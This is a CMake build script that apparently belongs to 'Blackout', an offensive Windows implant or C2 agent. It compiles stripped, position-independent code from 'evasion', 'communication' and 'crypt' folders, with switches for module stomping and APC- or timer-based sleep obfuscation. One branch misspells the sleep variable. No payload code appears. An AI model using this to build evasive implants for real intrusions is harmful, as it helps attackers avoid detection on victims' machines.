cmake_minimum_required( VERSION 3.16 )
project( Blackout )

set( CMAKE_CXX_STANDARD 11 )
set( CMAKE_CXX_STANDARD_REQUIRED ON )

include_directories( ./Include )

set( CMAKE_C_COMPILER   "x86_64-w64-mingw32-g++" )
set( CMAKE_CXX_COMPILER "x86_64-w64-mingw32-g++" )

set( AGENT_SRC_DIR ${CMAKE_SOURCE_DIR}/Source )
set( BIN_DIR ${CMAKE_SOURCE_DIR}/../Bin )
set( OBJ_DIR ${BIN_DIR}/agent_obj )

set( CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -Os -fno-asynchronous-unwind-tables -nostdlib" )
set( CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -fno-ident -fpack-struct=8 -falign-functions=1" )
set( CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -s -ffunction-sections -falign-jumps=1 -w -m64" )
set( CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -falign-labels=1 -fPIC" )
set( CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -Wl,-s,--no-seh,--enable-stdcall-fixup" )
set( CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -masm=intel -fpermissive -mrdrnd" )

set( AGENT_BKAPI "" CACHE STRING "Define the agent backend API." )
set( STOMP OFF CACHE BOOL "Enable BK_STOMP." )

if( AGENT_BKAPI )
    add_compile_definitions( ${AGENT_BKAPI} )
endif()

if( STOMP )
    add_compile_definitions( BK_STOMP )
endif()

if( SLEEP_TECHNIQUE STREQUAL "apc" )
    add_compile_definitions( _BK_SLEEP_OBF_=0x2030 )
elseif( SLEEP_TECHNIQUE STREQUAL "timer" )
    add_compile_definitions( _BK_SLEEP_OBF_=0x1030 )
elseif ( SLEE_TECHNIQUE STREQUAL "none" )
    add_compile_definitions( _BK_SLEEP_OBF_=0 )
endif()

file( GLOB BLACK_SRC "${AGENT_SRC_DIR}/*.c" )
file( GLOB BLACK_COM "${AGENT_SRC_DIR}/communication/*.c" )
file( GLOB BLACK_CRYP "${AGENT_SRC_DIR}/crypt/*.c" )
file( GLOB BLACK_MISC "${AGENT_SRC_DIR}/misc/*.c" )
file( GLOB BLACK_EVAS "${AGENT_SRC_DIR}/evasion/*.c" )
set( ASM_SRC "${AGENT_SRC_DIR}/Asm/Blackout.x64.asm" )
set( ASM_OUTPUT "${OBJ_DIR}/../asm_blackout.x64.o" )

file( MAKE_DIRECTORY ${BIN_DIR} )
file( MAKE_DIRECTORY ${OBJ_DIR} )

add_custom_command(
    OUTPUT ${ASM_OUTPUT}
    COMMAND nasm -f win64 ${ASM_SRC} -o ${ASM_OUTPUT}
    DEPENDS ${ASM_SRC}
    COMMENT "Compiling assembly: ${ASM_SRC}"
)

add_executable(${PROJECT_NAME}.x64.exe 
    ${BLACK_SRC} 
    ${BLACK_COM} 
    ${BLACK_CRYP} 
    ${BLACK_MISC} 
    ${BLACK_EVAS} 
    ${ASM_OUTPUT}
)

set_target_properties(${PROJECT_NAME}.x64.exe PROPERTIES
    RUNTIME_OUTPUT_DIRECTORY ${BIN_DIR}
)

set_target_properties(${PROJECT_NAME}.x64.exe PROPERTIES LINKER_LANGUAGE C)

set(LINKER_SCRIPT "${CMAKE_SOURCE_DIR}/../Scripts/Linker.ld")
target_link_options(${PROJECT_NAME}.x64.exe PRIVATE -T${LINKER_SCRIPT})
